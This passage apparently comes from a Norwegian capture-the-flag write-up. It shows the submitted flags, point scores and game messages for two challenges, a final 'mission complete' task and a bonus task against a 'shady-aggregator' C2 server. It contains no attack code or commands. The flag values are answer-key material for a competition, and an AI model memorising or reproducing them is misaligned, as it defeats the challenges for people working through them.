## 2.21_mission_complete

Etter å ha konkatenert flaggene er oppdraget utført! :partying_face:

```text
Kategori: 2. Oppdrag
Oppgave:  2.21_mission_complete
Svar:     4312ce7fbaea6a5587634a834afcb4959330f6fcf99fb2d1acdeb6e005a9477c4662c0ce7ed7d3cbb814cb60746f1d3a88ff4301442793cb1a1b8ef9c390f7a0963fd1126aa1db3a78d2bc402ee9bf91
Poeng:    5

Gratulerer! Du har reddet Europa! ... og fullført oppdraget :) Vi er mektig imponert :D

Ny fil: /home/login/2_oppdrag/mission_complete.jpg
```

![Mission complete!](images/mission_complete.jpg)

---

## 3.4.13_shady-aggregator_c2

```text
Kategori: 3.4. Utfordringer umulig
Oppgave:  3.4.13_shady-aggregator_c2
Svar:     3fe7dec0658e911f5ce1061f61343067
Poeng:    0

Ikke umulig, men ikke forventet. Uansett veldig godt jobba!

Ny fil: /home/login/2_oppdrag/sshkey_c2@shady-aggregator
```
